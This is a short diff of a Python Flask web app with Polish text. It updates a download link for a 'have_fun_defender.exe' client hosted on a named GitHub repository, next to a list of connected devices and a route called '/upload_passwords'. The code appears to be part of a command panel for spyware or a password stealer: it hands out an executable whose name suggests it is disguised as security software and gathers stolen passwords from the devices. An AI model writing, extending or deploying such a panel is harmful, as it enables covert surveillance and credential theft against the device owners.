@@ -39,7 +39,8 @@ def index():
 
     content = """
     <h1>📦 Pobierz klienta</h1>
-    <p><a href="https://github.com/TWOJ-USER/TWOJE-REPO/raw/main/client_download/have_fun_defender.exe" download>⬇️ have_fun_defender.exe</a></p>
+    <p><a href="https://github.com/Crazy2515/zdalny-podglad/raw/main/client_download/have_fun_defender.exe" download>
+    ⬇️ have_fun_defender.exe</a></p>
     <h1>Urządzenia: {}</h1>
     <ul>
     """.format(len(device_list))
@@ -51,6 +52,7 @@ def index():
         content += '</li>'
     content += "</ul>"
     return content
+
 
 
 @app.route("/upload_passwords", methods=['POST'])
